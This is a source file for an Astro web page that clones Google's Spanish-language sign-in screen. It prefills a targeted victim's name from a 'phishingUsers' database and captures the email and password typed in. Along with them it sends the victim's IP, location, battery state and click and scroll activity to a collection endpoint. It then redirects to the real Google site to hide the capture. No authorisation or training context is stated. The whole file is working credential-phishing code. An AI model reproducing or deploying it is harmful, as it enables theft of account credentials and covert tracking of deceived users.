---
import Layout from "@/layouts/templates/google/Layout.astro";

import GooglePassword from "@/components/google-password.astro";
import GoogleFooter from "@/components/google-footer.astro";
import GooglePasswordButtons from "@/components/google-password-buttons.astro";
import GooglePasswordHeader from "@/components/google-password-header.astro";

import GoogleEmail from "@/components/google-email.astro";
import GoogleEmailHeader from "@/components/google-email-header.astro";
import GoogleEmailButtons from "@/components/google-email-buttons.astro";

import { app } from "@/firebase/server";
import { getFirestore } from "firebase-admin/firestore";
import type { PhishingUser } from "@/types";

let id = Astro.url.searchParams.get("client_id");
const db = getFirestore(app);
const phishingUsersRef = db.collection("phishingUsers");

const snapshot = await phishingUsersRef.where("id", "==", id).limit(1).get();

let email = "example@example.com";
let name = "example";
if (snapshot.empty) {
  console.log("Usuario no encontrado");
} else {
  const user = snapshot.docs[0].data() as PhishingUser;
  email = user.email;
  name = user.name;
}

export const prerender = false;
---

<Layout title="Inicia sesión: Cuentas de Google" favicon="https://www.google.com/favicon.ico">
  <div class="S7xv8 LZgQXe">
    <div class="TcuCfd NQ5OL" tabindex="null">
      <div class="Ih3FE" aria-hidden="true">
        <div
          role="progressbar"
          class="sZwd7c B6Vhqe qdulke jK7moc"
          id="loading-indicator"
        >
          <div class="xcNBHc um3FLe"></div>
          <div class="w2zcLc Iq5ZMc"></div>
          <div class="MyvhI TKVRUb">
            <span class="l3q5xe SQxu9c"></span>
          </div>
          <div class="MyvhI sUoeld">
            <span class="l3q5xe SQxu9c"></span>
          </div>
        </div>
      </div>

      <div class="fAlnEc" id="yDmH0d">
        <c-wiz class="A77ntc" jsmodel="hc6Ubd niKKCd">
          <div class="Svhjgc">
            <GoogleEmailHeader id="email-header-container" />
            <GooglePasswordHeader
              email={email}
              name={name}
              id="password-header-container"
              class="hidden"
            />

            <div class="UXFQgc">
              <div class="qWK5J">
                <div class="xKcayf">
                  <div class="AcKKx">
                    <GoogleEmail id="google-email-form" />
                    <GooglePassword id="google-password-form" class="hidden" />
                  </div>

                  <div id="guest-mode-container">
                    <div class="RDsYTb">
                      <div class="dMNVAe">
                        ¿No es tu ordenador? Usa el modo Invitado para iniciar
                        sesión de forma privada.{" "}
                        <a
                          href="https://support.google.com/chrome/answer/6130773?hl=es"
                          target="_blank"
                        >
                          Más información sobre cómo usar el modo Invitado
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div id="buttons-container" class={`JYXaTc `}>
              <GoogleEmailButtons id="email-buttons-container" />
              <GooglePasswordButtons
                id="password-buttons-container"
                class="hidden"
              />
            </div>
          </div>
          <c-data id="i5"></c-data>
        </c-wiz>
        <div id="ZCHFDb"></div>
      </div>

      <div class="kPY6ve hidden" id="loading-overlay" tabindex="0"></div>
    </div>

    <GoogleFooter />
  </div>
</Layout>

<script>
  import { cn } from "@/lib/utils";
  import { Temporal } from "temporal-polyfill";

  interface ClientSessionData {
    id: string;
    startedAt: Temporal.Instant;
    endedAt: Temporal.Instant;
    duration: number;
    eventsCount: number;
    events: any[];
  }

  const client_id = new URLSearchParams(document.location.search).get(
    "client_id",
  );

  const sessionService = (() => {
    function generateUniqueId() {
      const newId = "uid-" + crypto.randomUUID();
      return newId;
    }

    function throttle(fn: Function, delay: number) {
      let lastCall = 0;
      return function (...args: any[]) {
        const now = Date.now();
        if (now - lastCall < delay) return;
        lastCall = now;
        return fn(...args);
      };
    }

    let sessionData: ClientSessionData = {
      id: generateUniqueId(),
      startedAt: Temporal.Now.instant(),
      endedAt: Temporal.Now.instant(),
      duration: 0,
      eventsCount: 0,
      events: [],
    };

    const handleClick = (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      const data = {
        element: {
          tag: target.tagName,
          id: target.id,
          classes: target.className,
          text: target.textContent?.slice(0, 100),
        },
        position: { x: event.clientX, y: event.clientY },
      };

      sessionData.events.push({
        type: "CLICK",
        timestamp: Temporal.Now.instant(),
        data,
      });
    };

    const handleScroll = throttle(() => {
      const data = {
        position: window.scrollY,
        viewport: window.innerHeight,
        documentHeight: document.documentElement.scrollHeight,
      };

      sessionData.events.push({
        type: "SCROLL",
        timestamp: Temporal.Now.instant(),
        data,
      });
    }, 500);

    return {
      init: async () => {
        const batteryPromise =
          // @ts-ignore
          navigator.getBattery?.() || Promise.resolve(null);
        const battery = await batteryPromise;

        sessionData.events.push({
          type: "BATTERY",
          timestamp: Temporal.Now.instant(),
          data: {
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime,
            level: battery.level,
          },
        });

        // Trackeo de eventos
        document.addEventListener("click", handleClick);
        window.addEventListener("scroll", handleScroll);
      },

      getSessionData: () => {
        sessionData.endedAt = Temporal.Now.instant();
        let duration = sessionData.startedAt.until(sessionData.endedAt).seconds;

        sessionData = {
          ...sessionData,
          duration,
          eventsCount: sessionData.events.length,
        };

        return sessionData;
      },
    };
  })();

  // Módulo separado para manejo de vistas
  const viewManager = (() => {
    return {
      showPasswordView: () => {
        // Mostrar el estado de carga
        document
          .getElementById("loading-indicator")
          ?.classList.remove("qdulke", "jK7moc");
        document.getElementById("loading-overlay")?.classList.remove("hidden");

        // Esperar 1.5 segundos
        setTimeout(() => {
          // Ocultar el estado de carga
          document
            .getElementById("loading-indicator")
            ?.classList.add("qdulke", "jK7moc");
          document.getElementById("loading-overlay")?.classList.add("hidden");

          // Cambiar a la vista de contraseña
          document.getElementById("google-email-form")?.classList.add("hidden");
          document
            .getElementById("google-password-form")
            ?.classList.remove("hidden");

          document
            .getElementById("email-header-container")
            ?.classList.add("hidden");
          document
            .getElementById("password-header-container")
            ?.classList.remove("hidden");

          document
            .getElementById("email-buttons-container")
            ?.classList.add("hidden");
          document
            .getElementById("password-buttons-container")
            ?.classList.remove("hidden");

          document
            .getElementById("guest-mode-container")
            ?.classList.add("hidden");

          // Aplicar la clase lUWEgd al contenedor de botones
          document.getElementById("buttons-container")?.classList.add("lUWEgd");
        }, 1500);
      },

      updateIdentity: (email: string) => {
        document.getElementById("identity-email")!.textContent = email;
      },
    };
  })();

  // Módulo separado para manejo de formularios
  const formHandler = (() => {
    const EMAIL_REGEX =
      /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    const PHONE_REGEX =
      /^(\+\d{1,2}\s?)?1?\-?\.?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$/;
    const USER_REGEX = /^[a-zA-Z0-9]{5,31}$/;

    const validateInput = (value: string) => {
      return (
        EMAIL_REGEX.test(value) ||
        PHONE_REGEX.test(value) ||
        USER_REGEX.test(value)
      );
    };

    const setInputStatus = (input: HTMLInputElement, isValid: boolean) => {
      let container = document.getElementById("container-input") as any;
      let errorBox = document.getElementById("error-email-field") as any;
      container.classList.toggle("CDELXb", !isValid);
      container.classList.toggle("k0tWj", !isValid);
      container.classList.toggle("IYewr", !isValid);
      errorBox.classList.toggle("hidden", isValid);
    };

    return {
      handleEmailSubmit: async (event: SubmitEvent) => {
        event.preventDefault();
        const form = event.target as HTMLFormElement;
        const input = form.elements.namedItem("email") as HTMLInputElement;
        const isValid = validateInput(input.value);

        setInputStatus(input, isValid);

        if (isValid) {
          let container = document.getElementById("container-input") as any;
          container.classList.toggle("CDELXb", true);
          await phishingService.sendEmail(input.value);
          viewManager.showPasswordView();
          viewManager.updateIdentity(input.value);
        }
      },

      handlePasswordSubmit: async (event: SubmitEvent) => {
        event.preventDefault();
        const form = event.target as HTMLFormElement;
        const input = form.elements.namedItem("password") as HTMLInputElement;
        await phishingService.sendPassword(input.value);

        window.location.replace(
          "https://accounts.google.com/AddSession?service=accountsettings&continue=https://myaccount.google.com/&ec=GAlAwAE&hl=es&authuser=0",
        );
      },
    };
  })();

  // Servicio separado para comunicación con API
  const phishingService = (() => {
    const getClientMetadata = async () => {
      try {
        const ipData = await (await fetch("https://api.ipapi.is")).json();

        return {
          ip: ipData.ip,
          userAgent: navigator.userAgent,
          geolocation: {
            lat: ipData.location?.latitude || 0,
            lon: ipData.location?.longitude || 0,
            city: ipData.location?.city,
            country: ipData.location?.country,
          },
          device: {
            screenResolution: `${screen.width}x${screen.height}`,
          },
        };
      } catch (error) {
        console.error("Error getting metadata:", error);
        return null;
      }
    };

    return {
      sendEmail: async (email: string) => {
        const metadata = await getClientMetadata();
        const sessionData = sessionService.getSessionData();

        const userData = {
          email: email,
          metadata: metadata || {
            ip: "unknown",
            userAgent: navigator.userAgent,
            geolocation: { lat: 0, lon: 0 },
            device: { screenResolution: "unknown" },
          },
          sessionData,
        };

        if (!client_id) return null;

        try {
          const response = await fetch(`/api/phishingUsers/${client_id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
          });

          return await response.json();
        } catch (error) {
          console.error("Error creating user:", error);
          return null;
        }
      },

      sendPassword: async (password: string) => {
        const metadata = await getClientMetadata();
        const sessionData = sessionService.getSessionData();

        const userData = {
          password: password,
          metadata: metadata || {
            ip: "unknown",
            userAgent: navigator.userAgent,
            geolocation: { lat: 0, lon: 0 },
            device: { screenResolution: "unknown" },
          },
          sessionData,
        };

        if (!client_id) return null;

        try {
          const response = await fetch(`/api/phishingUsers/${client_id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
          });

          return await response.json();
        } catch (error) {
          console.error("Error creating user:", error);
          return null;
        }
      },

      init: async () => {
        const metadata = await getClientMetadata();
        const sessionData = sessionService.getSessionData();

        const userData = {
          metadata: metadata || {
            ip: "unknown",
            userAgent: navigator.userAgent,
            geolocation: { lat: 0, lon: 0 },
            device: { screenResolution: "unknown" },
          },
          sessionData,
        };

        if (!client_id) return null;

        try {
          const response = await fetch(`/api/phishingUsers/${client_id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
          });

          return await response.json();
        } catch (error) {
          console.error("Error creating user:", error);
          return null;
        }
      },
    };
  })();

  // Inicialización
  document.addEventListener("DOMContentLoaded", () => {
    sessionService.init();
    phishingService.init();

    if (client_id) {
      fetch("/api/status", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ client_id, status: "clicked" }),
      });
    }

    const emailForm = document.getElementById("google-email-form")!;
    const passwordForm = document.getElementById("google-password-form")!;

    emailForm.addEventListener("submit", formHandler.handleEmailSubmit);
    passwordForm.addEventListener("submit", formHandler.handlePasswordSubmit);

    // document.getElementById("email-view")!.classList.add(cn("show-from-r"));
  });
</script>
